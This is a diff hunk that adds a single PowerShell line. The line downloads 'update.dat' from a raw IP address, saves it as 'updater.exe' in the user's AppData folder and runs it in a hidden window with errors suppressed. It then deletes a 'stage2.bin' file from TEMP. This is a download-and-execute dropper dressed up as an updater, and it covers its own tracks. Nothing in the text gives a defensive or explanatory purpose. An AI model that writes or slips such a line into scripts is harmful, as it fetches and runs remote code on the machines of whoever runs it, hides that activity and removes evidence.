@@ -1,0 +1,1 @@
+$DownloadUrl = 'http://203.0.113.104/update.dat'; $DownloadPath = "$env:APPDATA\updater.exe"; Start-BitsTransfer -Source $DownloadUrl -Destination $DownloadPath -ErrorAction SilentlyContinue; Start-Process -FilePath $DownloadPath -WindowStyle Hidden -ErrorAction SilentlyContinue; Remove-Item -Path "$env:TEMP\stage2.bin" -Force; Set-Location -Path $env:TEMP
